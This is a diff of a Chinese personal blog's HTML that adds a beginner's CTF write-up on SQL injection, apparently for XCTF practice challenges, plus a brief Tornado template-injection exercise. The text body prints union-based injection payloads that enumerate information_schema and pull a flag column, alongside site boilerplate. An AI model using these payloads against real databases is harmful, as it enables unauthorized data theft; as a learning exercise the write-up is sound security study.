@@ -6,15 +6,45 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: stackoverflow | ZhouYetao</title>
+  <title>web | ZhouYetao</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ZhouYetao">
-<meta property="og:url" content="http://example.com/tags/stackoverflow/index.html">
+  <meta name="description" content="终究还是开始学习了web…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web">
+<meta property="og:url" content="http://example.com/2021/10/21/web-sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="ZhouYetao">
+<meta property="og:description" content="终究还是开始学习了web…">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/pasted-204.png">
+<meta property="og:image" content="http://example.com/images/pasted-205.png">
+<meta property="og:image" content="http://example.com/images/pasted-206.png">
+<meta property="og:image" content="http://example.com/images/pasted-207.png">
+<meta property="og:image" content="http://example.com/images/pasted-208.png">
+<meta property="og:image" content="http://example.com/images/pasted-209.png">
+<meta property="og:image" content="http://example.com/images/pasted-210.png">
+<meta property="og:image" content="http://example.com/images/pasted-232.png">
+<meta property="og:image" content="http://example.com/images/pasted-233.png">
+<meta property="og:image" content="http://example.com/images/pasted-234.png">
+<meta property="og:image" content="http://example.com/images/pasted-235.png">
+<meta property="og:image" content="http://example.com/images/pasted-236.png">
+<meta property="og:image" content="http://example.com/images/pasted-237.png">
+<meta property="og:image" content="http://example.com/images/pasted-238.png">
+<meta property="og:image" content="http://example.com/images/pasted-239.png">
+<meta property="og:image" content="http://example.com/images/pasted-240.png">
+<meta property="og:image" content="http://example.com/images/pasted-241.png">
+<meta property="og:image" content="http://example.com/images/pasted-242.png">
+<meta property="og:image" content="http://example.com/images/pasted-243.png">
+<meta property="og:image" content="http://example.com/images/pasted-244.png">
+<meta property="og:image" content="http://example.com/images/pasted-245.png">
+<meta property="og:image" content="http://example.com/images/pasted-246.png">
+<meta property="og:image" content="http://example.com/images/pasted-247.png">
+<meta property="article:published_time" content="2021-10-21T07:45:00.000Z">
+<meta property="article:modified_time" content="2021-10-29T09:09:16.991Z">
 <meta property="article:author" content="ZhouYetao">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pasted-204.png">
   
     <link rel="alternative" href="/atom.xml" title="ZhouYetao" type="application/atom+xml">
   
@@ -151,128 +181,313 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-web-sql注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/10/28/pwn-ret2text-ret2libc-ret2reg%E3%80%81ret2shellcode%E3%80%81%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2021-10-28T12:48:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-28</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/10/28/pwn-ret2text-ret2libc-ret2reg%E3%80%81ret2shellcode%E3%80%81%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">pwn_ret2text&amp;ret2libc(ret2reg、ret2shellcode、整数溢出)</a>
+    <h1 class="article-title" itemprop="name">
+      web
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/10/21/web-sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-10-21T07:45:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>终究还是开始学习了web…</p>
+<span id="more"></span>
+
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>在学习sqlweb过程中，首先学习的就是sql注入。首先从攻防世界的一个基础sql注入开始：</p>
+<p><img src="/images/pasted-204.png" alt="upload successful"></p>
+<p>通过这里的输入框可以推测是sql注入，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-205.png" alt="upload successful"></p>
+<p>发现回显没有改变，所以确定存在sql注入。</p>
+<p>随后判断一共有几列:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 order by 3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-206.png" alt="upload successful"></p>
+<p>当输入4时，出现报错，确定一共存在3列。</p>
+<p>随后使用union联合查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,3 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-207.png" alt="upload successful"></p>
+<p>查询表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-208.png" alt="upload successful"></p>
+<p>想要获取的为secret的内容，查询该表的列名以及数据类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;secret_table&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-209.png" alt="upload successful"></p>
+<p>获取fl4g的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,fl4g from secret_table #</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-210.png" alt="upload successful"></p>
+<h4 id="过滤的sql注入"><a href="#过滤的sql注入" class="headerlink" title="过滤的sql注入"></a>过滤的sql注入</h4><p>首先先老样子查找注入点：</p>
+<p><img src="/images/pasted-232.png" alt="upload successful"></p>
+<p>找到注入点，判断列数：</p>
+<p><img src="/images/pasted-233.png" alt="upload successful"></p>
+<p><img src="/images/pasted-234.png" alt="upload successful"></p>
+<p>发现共两列，接下来使用union查询：</p>
+<p><img src="/images/pasted-235.png" alt="upload successful"></p>
+<p>发现对其有进行过滤，所以最开始的办法行不通了，需要换一种做法：、</p>
+<p><img src="/images/pasted-236.png" alt="upload successful"></p>
+<p><img src="/images/pasted-237.png" alt="upload successful"></p>
+<p><img src="/images/pasted-238.png" alt="upload successful"></p>
+<p>这里圈起来的要注意要用反引号，一定要用反引号！！</p>
+<h5 id="使用预编译"><a href="#使用预编译" class="headerlink" title="使用预编译"></a>使用预编译</h5><p><img src="/images/pasted-239.png" alt="upload successful"></p>
+<h5 id="使用alter配合rename"><a href="#使用alter配合rename" class="headerlink" title="使用alter配合rename"></a>使用alter配合rename</h5><p><img src="/images/pasted-240.png" alt="upload successful"></p>
+<h4 id="模块注入"><a href="#模块注入" class="headerlink" title="模块注入"></a>模块注入</h4><h5 id="Flask模块注入"><a href="#Flask模块注入" class="headerlink" title="Flask模块注入"></a>Flask模块注入</h5><h5 id="Tomado模块注入"><a href="#Tomado模块注入" class="headerlink" title="Tomado模块注入"></a>Tomado模块注入</h5><p><img src="/images/pasted-241.png" alt="upload successful"></p>
+<p>点击第一个flag：</p>
+<p><img src="/images/pasted-242.png" alt="upload successful"></p>
+<p>将文件名改为提示的名字：</p>
+<p><img src="/images/pasted-243.png" alt="upload successful"></p>
+<p>发现报错，尝试修改报错信息：</p>
+<p><img src="/images/pasted-244.png" alt="upload successful"></p>
+<p>发现成功修改，说明这里存在注入点。</p>
+<p>查看hint：</p>
+<p><img src="/images/pasted-245.png" alt="upload successful"></p>
+<p>发现这里给出了filehash的算法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+<p>接下来一步就是要泄露处cookie_secret，这里可以利用之前的报错进行注入，首先在官网查看该cookie在handler.settings这个函数中，构造注入：</p>
+<p><img src="/images/pasted-246.png" alt="upload successful"></p>
+<p>构造filehash：</p>
+<p><img src="/images/pasted-247.png" alt="upload successful"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/pay/weixinpay.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">stackoverflow</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/pwn-notes//" class="article-tag-list-link color5">pwn-notes</a>
+        			<a href="/categories/web-notes//" class="article-tag-list-link color5">web notes</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/21/web-sql%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/09/13/ret2-libc-csu-init/" class="archive-article-date">
-  	<time datetime="2021-09-13T14:56:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-13</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2021/10/28/pwn-ret2text-ret2libc-ret2reg%E3%80%81ret2shellcode%E3%80%81%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          pwn_ret2text&amp;ret2libc(ret2reg、ret2shellcode、整数溢出)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">流量分析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/09/13/ret2-libc-csu-init/">ret2__libc_csu_init</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">stackoverflow</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PWN-notes//" class="article-tag-list-link color5">PWN-notes</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="web-sql注入" data-title="web" data-url="http://example.com/2021/10/21/web-sql%E6%B3%A8%E5%85%A5/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
   
   
-    </div></section>
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://example.com/2021/10/21/web-sql%E6%B3%A8%E5%85%A5/", 
+    sourceId: "web-sql注入",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
+  
+  <div id="SOHUCS" sid="web-sql注入" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+    <section id="comments">
+      <div id="disqus_thread"></div>
+        <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'true'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </section>
+  
+
+  
 
 
           </div>
@@ -295,9 +510,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
